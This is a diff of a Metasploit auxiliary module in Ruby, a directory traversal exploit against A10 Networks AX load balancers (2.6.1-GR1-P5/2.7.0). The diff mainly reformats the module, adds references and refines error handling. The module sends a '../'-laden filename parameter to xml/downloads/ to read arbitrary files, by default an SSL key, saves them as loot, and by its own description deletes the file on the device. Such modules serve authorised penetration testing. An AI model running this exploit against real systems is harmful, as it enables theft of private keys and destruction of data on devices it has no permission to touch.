@@ -13,21 +13,26 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'A10 Networks (Soft)AX Loadbalancer 2.6.1-GR1-P5 and 2.7.0 Directory Traversal',
+      'Name'           => 'A10 Networks AX Loadbalancer Directory Traversal',
       'Description'    => %q{
-        This module exploits a directory traversal flaw found in A10 Networks (Soft)
-        AX loadbalancers version 2.6.1-GR1-P5/2.7.0 or less.  When handling a file download request,
-        the xml/downloads class fails to properly check the 'filename' parameter, which
-        can be abused to read any file outside the virtual directory. Important files include SSL certificates.
-        This module works on both the hardware devices and the Virtual Machine appliances.
-        IMPORTANT NOTE: This will also delete the file on the device after downloading it.
+        This module exploits a directory traversal flaw found in A10 Networks
+        (Soft) AX Loadbalancer version 2.6.1-GR1-P5/2.7.0 or less.  When
+        handling a file download request, the xml/downloads class fails to
+        properly check the 'filename' parameter, which can be abused to read
+        any file outside the  virtual directory. Important files include SSL
+        certificates. This module works on both the hardware devices and the
+        Virtual Machine appliances.  IMPORTANT NOTE: This will also delete the
+        file on the device after downloading it.
       },
       'References'     =>
         [
+          ['OSVDB', '102657'],
+          ['BID', '65206'],
+          ['EDB', '31261']
         ],
       'Author'         =>
         [
-          'xistence',  #Vulnerability discovery and Metasploit module
+          'xistence'  #Vulnerability discovery and Metasploit module
         ],
       'License'        => MSF_LICENSE,
       'DisclosureDate' => "Jan 28 2014"
@@ -35,7 +40,6 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('RPORT', [true, 'The target port', 80]),
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),
         OptString.new('FILE', [true, 'The file to obtain', '/a10data/key/mydomain.tld']),
         OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10])
@@ -44,9 +48,6 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def run_host(ip)
-    base = normalize_uri(target_uri.path)
-    base << '/' if base[-1,1] != '/'
-
     peer = "#{ip}:#{rport}"
     fname = datastore['FILE']
 
@@ -54,20 +55,19 @@ class Metasploit3 < Msf::Auxiliary
     traverse = "../" * datastore['DEPTH']
     res = send_request_cgi({
       'method'   => 'GET',
-      'uri'      => "#{base}xml/downloads/",
-      'vars_get' => {
-        'filename' => "/a10data/tmp/#{traverse}#{datastore['FILE']}"
-      }
+      'uri'      => normalize_uri(target_uri.path, "xml", "downloads", ""),
+      'vars_get' =>
+        {
+          'filename' => "/a10data/tmp/#{traverse}#{datastore['FILE']}"
+        }
     })
 
-
     if res and res.code == 500 and res.body =~ /Error report/
-      print_error("#{peer} - Cannot obtain '#{fname}', here are some possible reasons:")
-      print_error("\t1. File does not exist.")
-      print_error("\t2. The server does not have any patches deployed.")
-      print_error("\t3. Your 'DEPTH' option isn't deep enough.")
-      print_error("\t4. Some kind of permission issues.")
-
+      vprint_error("#{peer} - Cannot obtain '#{fname}', here are some possible reasons:")
+      vprint_error("\t1. File does not exist.")
+      vprint_error("\t2. The server does not have any patches deployed.")
+      vprint_error("\t3. Your 'DEPTH' option isn't deep enough.")
+      vprint_error("\t4. Some kind of permission issues.")
     elsif res and res.code == 200
       data = res.body
       p = store_loot(
@@ -77,12 +77,12 @@ class Metasploit3 < Msf::Auxiliary
         data,
         fname
       )
-
       vprint_line(data)
       print_good("#{peer} - #{fname} stored as '#{p}'")
-
+    elsif res and res.code == 404 and res.body.to_s =~ /The requested URL.*was not found/
+      vprint_error("#{peer} - File not found. Check FILE.")
     else
-      print_error("#{peer} - Fail to obtain file for some unknown reason")
+      vprint_error("#{peer} - Fail to obtain file for some unknown reason")
     end
   end
 
